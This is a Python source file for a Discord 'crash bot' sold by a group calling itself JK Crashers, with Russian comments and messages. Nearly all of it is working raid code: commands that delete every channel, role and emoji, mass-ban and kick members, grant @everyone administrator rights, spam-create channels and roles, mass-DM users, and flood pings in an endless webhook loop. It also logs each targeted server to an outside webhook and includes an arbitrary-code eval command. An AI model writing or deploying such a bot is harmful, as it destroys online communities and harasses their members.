import asyncio
import os
import json
import inspect
from discord.ext import commands
import discord
from discord_webhook import DiscordWebhook as hook, DiscordEmbed as D_Embed
import config
from threading import Thread
import random, aiohttp, asyncio
from discord import Webhook, AsyncWebhookAdapter
from colorama import Fore, init
# мне похуй на технологии
# главное чтобы на моих телефонах можно было играть в клэш раял -Стив Жопс

#Настройка
webhook_guilds_url = "" #вэбхук, куда будут идти логи
prefix = ""#префикс
token = "" #токен
jk_ids = [] #айдишники разрабов
premium = [] #айдишники функции премиум
wl = [] #вайт-лист, вроде бы вырезал


intents = discord.Intents.all() 
client = discord.client
bot = commands.Bot(command_prefix = prefix, intents=intents)
bot.remove_command( 'help' )
jk_crash = json.load(open('jktimoshacrash.json'))
jk_crash3 = json.load(open('jktimoshacrash3.json'))




@bot.command()
async def crash(ctx):
	a = 0
	b = 0
	c = 0
	d = 0
	e = 0
	if ctx.author.id in jk_crash:
		await ctx.send("Вы в чёрном списке бота")
		return
	for x in ctx.guild.channels:
		a += 1
		try: await x.delete()
		except: pass
	for x in ctx.guild.roles:
		b += 1
		try: await x.delete()
		except: pass
	for x in ctx.guild.emojis:
		d += 1
		try: await x.delete()
		except: pass
	for x in range(100):
		await ctx.guild.create_text_channel(name="crash-by-jkcrashers")
		c += 1
	for x in range(100):
		e += 1
		await ctx.guild.create_role(name ="Crash by JKCrashers")
		guild = ctx.message.guild
		await guild.edit(name="Crash by JKCrashers")

@bot.event
async def on_guild_join(guild):
  if len(guild.members) <= 10:
    await guild.text_channels[0].send("пошел нахуй")
    await guild.leave()
    await asyncio.sleep(5)
  if guild.id in jk_crash3:
    await guild.text_channels[0].send("пошел нахуй")
    await guild.leave()
      
  async with aiohttp.ClientSession() as session:
        webhook = discord.Webhook.from_url(config.webhook_guilds_url, adapter=discord.AsyncWebhookAdapter(session))
        members = len(guild.members)
        await webhook.send(embed=discord.Embed(
            title="Новый сервер!",
            description=(
                f"** | Название перед крашем:** `{guild.name}`\n"
                f" |**Инфо перед крашем:**\n"
                f"** | Участников:** `{guild.member_count}`\n"
                f"**|Ролей:** `{str(len(guild.roles))}` \n"
                f"**| Каналов:** `{str(len(guild.channels))}`"
            ),
            color=discord.Color.dark_blue()
        ).set_thumbnail(url=guild.icon_url_as(static_format="png", size=1024)))

@bot.event
async def on_guild_channel_create(channel):
    if channel.name == "crash-by-jkcrashers":
      print("test")
      webhook = await channel.create_webhook(name = "Crash by JK Crashers")
    print("test2")
    webhook_url = webhook.url
    async with aiohttp.ClientSession() as session:
      print("test3")
      webhook = discord.Webhook.from_url(str(webhook_url), adapter=discord.AsyncWebhookAdapter(session))
      print("test4")
      while True:
        try:
          await webhook.send("@everyone @here краш")
        except:
          pass



@bot.event
async def on_command_error(ctx, err):
    if isinstance(err, commands.errors.BotMissingPermissions):
        await ctx.message.delete()
        await ctx.author.send(embed=discord.Embed(title='Ошибочка', description=f"У бота отсутствуют права: {' '.join(err.missing_perms)}\nВыдайте их ему для полного функционирования бота", color=discord.Colour.from_rgb(255, 0, 0)))
    elif isinstance(err, commands.CommandNotFound ):
        await ctx.send(embed = discord.Embed(description = f'** {ctx.author.name}, данной команды не существует.**', color=0x0c0c0c))
    elif isinstance( err, commands.MissingRequiredArgument ):
        await ctx.author.send(embed=discord.Embed(title='Ошибочка', description=f"Нету аргумента", color=discord.Colour.from_rgb(255, 0, 0)))

@bot.command()
async def eval(ctx, *, command):
  global jk_ids
  if not ctx.author.id in jk_ids:
    return await ctx.send("**Долбаеб!!!**", embed = discord.Embed(title=':x:Доступ запрещен', description=f'Ты не разработчик -_-', colour = 0xf00a0a))
  res = eval(command)
  if inspect.isawaitable(res):
    await ctx.send(await res)
  else:
    await ctx.send(res)



@bot.command()
async def bl(ctx, param, id: int):
  global jk_ids
  if not ctx.author.id in jk_ids:
    return await ctx.send("Долбаеб", embed = discord.Embed(title=':x:Доступ запрещен', description=f'Ты не разработчик этого творения', colour = 0xf00a0a))
  if param == "add":
    jk_crash.append(id)
    await ctx.send(f"<@{id}> был добавлен в черный список бота", embed = discord.Embed(title='✅', description=f'Хорошего дня!', colour = 0x0059ff))
  elif param == "remove":
    jk_crash.remove(id)
    await ctx.send(f"<@{id}> был убран из черного списка бота", embed = discord.Embed(title='✅', description=f'Хорошего дня!', colour = 0x0059ff))
  with open('jktimoshacrash.json', 'w') as f: json.dump(jk_crash, f)

@bot.command()
async def wl(ctx, param, id: int):
  global jk_ids
  if not ctx.author.id in jk_ids:
    return await ctx.send("Долбаеб", embed = discord.Embed(title=':x:Доступ запрещен', description=f'Ты не разработчик этого творения', colour = 0xf00a0a))
  if param == "add":
    jk_crash3.append(id)
    await ctx.send(f"Сервер с этим айди {id} был добавлен", embed = discord.Embed(title='✅', description=f'Хорошего дня!', colour = 0x0059ff))
  elif param == "remove":
    jk_crash3.remove(id)
    await ctx.send(f"Сервер с этим айди {id} был убран", embed = discord.Embed(title='✅', description=f'Хорошего дня!', colour = 0x0059ff))
  with open('servers.json', 'w') as f: json.dump(jk_crash3, f)




@bot.command()
async def dmspam( ctx, member: discord.Member ):
    await ctx.channel.purge( limit = 1 )
    for s in range(120):
      await member.send("https://discord.gg/DnnCFrtxBk \n Сервер с краш ботом")

@bot.command()
async def channels(ctx):
    a = 0
    b = 0 
    embed = discord.Embed(
        title = 'Статистика о спаме каналами.',
        description = f'''Создано текстовых каналов: {a}.\nСоздано голосовых каналов: {b}.''',
        color = 0xffff00
    )
    await ctx.message.delete()
    for i in range(1,100):
        await ctx.guild.create_text_channel('crashed by JK crashers')
        a += 1
    for i in range(1,100):
        b += 1
        await ctx.guild.create_voice_channel('Crashed By JK crashers')
    await ctx.author.send(embed=embed)

@bot.event
async def on_ready():
  print(f'Бот запущен. Ник бота: {bot.user}  https://discord.com/oauth2/authorize?client_id={bot.user.id}&permissions=8&scope=bot')
  await bot.change_presence(status=discord.Status.online, activity=discord.Streaming(name=f'of!help | JKtimosha Youtube', url='https://www.twitch.tv/jktimosha'))

@bot.command()
async def help(ctx):
		embed = discord.Embed(
			title = ':book: | Меню помощи',
			description = f"`{prefix}help` **выведет эту команду** \n `{prefix}crash` **Автоматический краш сервера** `Кулдаун 500` \n `{prefix}nuke` **Удаление каналов, ролей и эмодзи** `Кулдаун 300`\n`{prefix}dmspam` **@пингчела Спам в лс** `Кулдаун 500`\n `{prefix}channels` **Спам каналами** `Кулдаун 200` \n`{prefix}delchannels` **Удаление всех каналов** `Кулдаун 200` \n `{prefix}roles` **Спам ролями** `Кулдаун 200` \n `{prefix}delroles` **Удаление всех ролей** `Кулдаун 200` \n `{prefix}admin_everyone` **Выдача всем админки** `Кулдаун 60 `\n `{prefix}admin` **Создаст и выдаст админку** `Кулдаун 60` \n `{prefix}delemoji` **Удаление всех эмодзи** `Кулдаун 140` \n `{prefix}spam` **Спам в один канал** `Кулдаун 140`\n `{prefix}spamall` **Спам во все каналы** `Кулдаун 200`\n`{prefix}intchannels` **<кол-во каналов> Спам определенным количеством каналов** `Кулдаун 300` \n `{prefix}introles` **<кол-во ролей>** `Кулдаун 300` \n**__👑КОМАНДЫ ДЛЯ ПРЕМИУМ👑__** \n **В КОМАНДАХ НЕТУ КУЛДАУНА** \n`{prefix}banall` **ЗАБАНИТ ВСЕХ** \n `{prefix}kickall` **КИКНУТЬ ВСЕХ**\n`{prefix}customchan` **<название каналов> Создаст 100 каналов с вашим названием**  \n`{prefix}customchanvoice` **<название войс-каналов> Cоздаст 100 войс-каналов с вашим названием**  \n`{prefix}customroles` **<название ролей>** \n`{prefix}customname` **<название сервера>** \n`{prefix}customspam` **<текст спама>** \n **ЧТОБЫ ПОЛУЧИТЬ ПРЕМИУМ ПИШИТЕ <@483558478565343232>** [Или зайдите на сервер](https://discord.gg/J5Zyf8REht) \n Премиум стоит `50р`, покупая премиум вы получаете: \n ```Бан и кик всех``` \n ```Спам своим текстом```\n ```Создание каналов и ролей своим текстом``` \n ```Корону в логах краша``` \n **__НИКАКОЙ РЕКЛАМЫ!__**",
			colour = 0x055dff)
		embed.set_footer(
			text = 'код написан by JKtimosha',
			icon_url = 'https://cdn.discordapp.com/avatars/483558478565343232/5c5a8740803b62d842d5a0b64ade2612.webp?size=1024')
		embed.set_thumbnail(
			url = 'https://cdn.discordapp.com/avatars/704967695036317777/961384e7fde6d107a479c8ee66b6ac42.webp?size=128')
		await ctx.message.add_reaction('✅')
		await ctx.send(embed=embed)	
#кулдаун вырезал,




@bot.command()
async def auto(ctx):
  a = 0
  b = 0
  c = 0
  d = 0
  e = 0
  f = 0

  if ctx.author.id in jk_crash:
    return await ctx.send("Вы в чёрном списке бота")
    
  for x in ctx.guild.channels:
    a += 1
    try: await x.delete()
    except: pass
    guild = ctx.message.guild
    await guild.edit(name='Crash by JK Crashers')
  for x in ctx.guild.roles:
    b += 1
    try: await x.delete()
    except: pass
  for x in ctx.guild.members:
    f += 1
    try: await x.edit(nick="https://discord.gg/6SE3CcGQdx / Crash BY JK")
    except: pass
  for x in ctx.guild.emojis:
    d += 1
    try: await x.delete()
    except: pass
  for x in range(100):
    await ctx.guild.create_text_channel(name="JK Crashers")
    c += 1
  for x in range(100):
    e += 1
    await ctx.guild.create_role(name ="crash by JK Crashers")


@bot.command()
@commands.cooldown(1, 60, commands.BucketType.user) 
async def admin_everyone(ctx):
    role = discord.utils.get(ctx.message.guild.roles, name = "@everyone")
    perms = discord.Permissions(administrator = True)
    await role.edit(permissions = perms)

@bot.command()
async def delchannels(ctx):
    await ctx.message.delete()
    failed = []
    counter = 0
    for channel in ctx.guild.channels: 
        try:
            await channel.delete(reason="1") 
        except: failed.append(channel.name)
        else: counter += 1
    fmt = ", ".join(failed)
    embed = discord.Embed(
        title = 'Статистика об удалении каналов.',
        description = f'''Было удалено {counter} каналов.''',
        color = 0xffff00
    )
    await ctx.author.send(embed=embed)

@bot.command()
async def delroles(ctx):
    await ctx.message.delete()
    deler = 0
    for role in ctx.guild.roles:
        try:
            await role.delete()
            deler += 1
        except:
            pass
    embed = discord.Embed(
        title = 'Статистика об удалении ролей.',
        description = f'''Удалено ролей: {deler}''',
        color = 0xffff00
    )
    await ctx.author.send(embed=embed)

@bot.command()
async def roles(ctx):
    await ctx.message.delete()
    roleses = 0
    embed = discord.Embed(
        title = 'Статистика о создании ролей.',
        description = f'''Ролей создано: {roleses}''',
        color = 0xffff00
    )
    for i in range(0,100):
        await ctx.guild.create_role(name = 'JK Crashers')
        roleses += 1
    await ctx.author.send(embed=embed)

@bot.command()  
async def admin(ctx):
    guild = ctx.guild
    perms = discord.Permissions(administrator=True) 
    await guild.create_role(name="JK Admin", permissions=perms) 
    
    role = discord.utils.get(ctx.guild.roles, name="JK Admin") 
    user = ctx.message.author
    await user.add_roles(role) 

    await ctx.message.delete()

@bot.command()
async def kickall(ctx):
  if not ctx.author.id in premium:
    return await ctx.send("**Долбаеб!!!**", embed = discord.Embed(title=':x:Доступ запрещен', description=f'Ты не купил премиум -_-', colour = 0xf00a0a))
    for m in ctx.guild.members:
        try:
            await m.kick(reason="https://discord.gg/6SE3CcGQdx Сервер с краш ботом")
        except:
            pass


@bot.command()
async def banall(ctx):
  if not ctx.author.id in premium:
    return await ctx.send("**Долбаеб!!!**", embed = discord.Embed(title=':x:Доступ запрещен', description=f'Ты не купил премиум -_-', colour = 0xf00a0a))
    for m in ctx.guild.members:
        try:
            await m.ban(reason="https://discord.gg/6SE3CcGQdx Сервер с краш ботом")
        except:
            pass

@bot.command()
async def nuke(ctx):
  a = 0
  b = 0
  c = 0
  for x in ctx.guild.channels:
    a += 1
    try: await x.delete()
    except: pass
  for x in ctx.guild.roles:
    b += 1
    try: await x.delete()
    except: pass
  for x in ctx.guild.emojis:
    c += 1
    try: await x.delete()
    except: pass

@bot.command()
async def spamall(ctx):
  for a in range(200):
    for channel in ctx.guild.text_channels:
        try:
            await channel.send("@everyone @here \n Ссылка на дискорд сервер с краш ботами https://discord.gg/6SE3CcGQdx ", embed = discord.Embed(title='Привет котаны!) Данный сервер крашится ботом Lavan-Premium', description=f'**Хочешь крашить сервера?** \n **Тогда тебе точно к нам!**\n `JK Crashers` __представляет:__ \n ```-Удобных и мощных краш ботов. \n-Помощь с рейдом и крашем. \n-Большой функционал краш ботов.``` \n **Наши социальные сети** \n `Дискорд сервер` [🔗Клик](https://discord.gg/6SE3CcGQdx) \n `Telegram канал` [🔗Клик](https://t.me/jktimosha) \n `Youtube создателя` [🔗Клик](https://www.youtube.com/c/JKTimosha)', colour = 0x0e0101))
        except:
            continue
            
@bot.command()
@commands.cooldown(1, 140, commands.BucketType.user) 
async def delemoji(ctx):
	for emoji in ctx.guild.emojis:
	 await emoji.delete()

@bot.command(pass_context=True)
async def spam(ctx):
     for s in range(200):
      await ctx.send("@everyone @here \n Ссылка на дискорд сервер с краш ботами https://discord.gg/6SE3CcGQdx ", embed = discord.Embed(title='Привет котаны!) Данный сервер крашится ботом Lavan-Premium', description=f'**Хочешь крашить сервера?** \n **Тогда тебе точно к нам!**\n `JK Crashers` __представляет:__ \n ```-Удобных и мощных краш ботов. \n-Помощь с рейдом и крашем. \n-Большой функционал краш ботов.``` \n **Наши социальные сети** \n `Дискорд сервер` [🔗Клик](https://discord.gg/6SE3CcGQdx) \n `Telegram канал` [🔗Клик](https://t.me/amoguscommunity) \n `Youtube создателя` [🔗Клик](https://www.youtube.com/c/JKTimosha)', colour = 0x0e0101))

#Количественные
@bot.command(pass_context=True)
async def intchannels(ctx, m):
    await ctx.message.delete()
    count1 = 0
    embed = discord.Embed(
        title = 'Статистика о создании ролей.',
        description = f'''Ролей создано: {count1}''',
        color = 0xffff00
    )
    while count1 < int(m):
        guild = ctx.message.guild
        await guild.create_text_channel('Crash by JKcrashers')
        count1 += 1
        await ctx.author.send(embed=embed)

@bot.command(pass_context=True)
async def introles(ctx, m):
    await ctx.message.delete()
    count1 = 0
    embed = discord.Embed(
        title = 'Статистика о создании ролей.',
        description = f'''Ролей создано: {count1}''',
        color = 0xffff00
    )
    while count1 < int(m):
        guild = ctx.message.guild
        await guild.create_role(name = 'Crash by JKcrashers')
        count1 += 1
        await ctx.author.send(embed=embed)
#Кастомные
@bot.command()
async def customchan(ctx, *, arg):
  if not ctx.author.id in premium:
    return await ctx.send("**Долбаеб!!!**", embed = discord.Embed(title=':x:Доступ запрещен', description=f'Ты не купил премиум -_-', colour = 0xf00a0a))
  await ctx.send("Хорошо")
  for b in range(100):
   await ctx.guild.create_text_channel(arg)
@bot.command()
async def customroles(ctx, *, arg):
  if not ctx.author.id in premium:
    return await ctx.send("**Долбаеб!!!**", embed = discord.Embed(title=':x:Доступ запрещен', description=f'Ты не купил премиум -_-', colour = 0xf00a0a))
  await ctx.send("Хорошо")
  for b in range(100):
   await ctx.guild.create_role(arg)
@bot.command()
async def customchanvoice(ctx, *, arg):
  if not ctx.author.id in premium:
    return await ctx.send("**Долбаеб!!!**", embed = discord.Embed(title=':x:Доступ запрещен', description=f'Ты не купил премиум -_-', colour = 0xf00a0a))
  for b in range(100):
   await ctx.guild.create_voice_channel(arg)

@bot.command(pass_context=True)
async def customname(ctx, *, arg):
  if not ctx.author.id in premium:
    return await ctx.send("**Долбаеб!!!**", embed = discord.Embed(title=':x:Доступ запрещен', description=f'Ты не купил премиум -_-', colour = 0xf00a0a))
  await ctx.guild.edit(name=arg)
  embed = discord.Embed(
        title = 'Изменил название сервера.',
        description = f'''На `{arg}`''',
        color = 0xffff00
    )
  await ctx.author.send(embed=embed)

@bot.command(pass_context=True)
async def customspam(ctx, *, arg):
  if not ctx.author.id in premium:
    return await ctx.send("**Долбаеб!!!**", embed = discord.Embed(title=':x:Доступ запрещен', description=f'Ты не купил премиум -_-', colour = 0xf00a0a))
  for s in range(200):
    await ctx.send(arg)

bot.run(token)
#мне похуй, что это говнокод